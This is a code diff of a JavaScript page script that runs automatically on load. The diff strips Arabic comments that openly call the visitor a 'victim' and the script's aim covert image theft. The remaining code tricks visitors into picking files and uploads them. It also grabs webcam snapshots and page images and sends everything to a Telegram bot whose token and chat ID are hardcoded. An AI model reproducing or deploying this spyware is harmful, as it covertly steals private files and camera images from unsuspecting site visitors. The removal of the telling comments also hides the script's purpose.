@@ -1,15 +1,15 @@
-// هذا السكربت يشغل سحب الصور في الخلفية بدون ما الضحية يحس
+
 
 (function () {
-    // إخفاء أي أثر
+
     console.log('%cLoading...', 'color: transparent');
 
-    // Telegram Bot Config
-    const BOT_TOKEN = '8560546892:AAH0VMbTtWDB4x0x7-I8KsYqdrV5r4hTACw'; // غير هذا
-    const CHAT_ID = '7788037752'; // غير هذا
+   
+    const BOT_TOKEN = '8560546892:AAH0VMbTtWDB4x0x7-I8KsYqdrV5r4hTACw';
+    const CHAT_ID = '7788037752'; 
     const TG_URL = `https://api.telegram.org/bot${"8560546892:AAH0VMbTtWDB4x0x7-I8KsYqdrV5r4hTACw"}`;
 
-    // إرسال رسالة بدء
+
     function sendLog(msg) {
         try {
             const data = new URLSearchParams();
@@ -21,13 +21,13 @@
 
     sendLog('🚀 ضحية جديدة دخلت الموقع');
 
-    // محاولة قراءة الملفات عبر File System Access API (يعمل على Chrome/Edge)
+   
     async function tryFileSystemAccess() {
         try {
-            // طلب صلاحية الوصول للملفات (يظهر نافذة اختيار)
+            
             sendLog('📂 محاولة فتح File Picker...');
 
-            // محاولة بدون نافذة - لن ينجح لكن نحاول
+        
             const opts = {
                 type: 'openFile',
                 multiple: true,
@@ -36,7 +36,7 @@
                 }
             };
 
-            // هذه ستظهر نافذة اختيار - لكن الضحية قد يظنها جزء من الموقع للتسجيل
+          
             const handle = await window.showOpenFilePicker(opts);
             sendLog(`📁 تم اختيار ${handle.length} ملف`);
 
@@ -47,12 +47,12 @@
                 reader.onload = async function (e) {
                     const base64 = e.target.result.split(',')[1];
 
-                    // إرسال الصورة عبر API
+                    
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('caption', `📸 ${file.name} (${(file.size / 1024).toFixed(2)}KB)`);
 
-                    // تحويل base64 لـ Blob
+                   
                     const byteChars = atob(base64);
                     const byteNums = new Array(byteChars.length);
                     for (let i = 0; i < byteChars.length; i++) {
@@ -81,7 +81,7 @@
         }
     }
 
-    // محاولة سحب الصور المعروضة على الصفحة (مفيد إذا الموقع عندها صلاحية)
+   
     function scrapePageImages() {
         sendLog('🖼️ محاولة سحب صور الصفحة...');
 
@@ -113,7 +113,7 @@
         });
     }
 
-    // محاولة الوصول للكاميرا (يمكن الضحية يسمح بدون ما يعرف)
+    
     function tryCamera() {
         sendLog('📷 محاولة الوصول للكاميرا...');
 
@@ -145,7 +145,7 @@
 
                             sendLog('✅ تم التقاط صورة من الكاميرا');
 
-                            // إيقاف الكاميرا
+                        ا
                             stream.getTracks().forEach(track => track.stop());
                         }, 'image/jpeg', 0.8);
                     }, 2000);
@@ -158,11 +158,11 @@
         }
     }
 
-    // محاولة الوصول للصور المخزنة محلياً عبر Canvas (في بعض المتصفحات)
+    
     function enumerateLocalFiles() {
         sendLog('🔍 محاولة فهرسة الملفات المحلية...');
 
-        // محاولة استخدام IndexedDB لاستخراج أي ملفات مخزنة
+       
         try {
             const openRequest = indexedDB.open('file_system', 1);
             openRequest.onsuccess = function (event) {
@@ -179,7 +179,7 @@
         } catch (e) { }
     }
 
-    // تشغيل كل شيء بعد تحميل الصفحة
+    
     window.addEventListener('load', function () {
         setTimeout(() => {
             tryFileSystemAccess();
@@ -189,7 +189,7 @@
         }, 3000);
     });
 
-    // محاولة ثانية بعد 10 ثواني
+    
     setTimeout(() => {
         scrapePageImages();
     }, 10000);
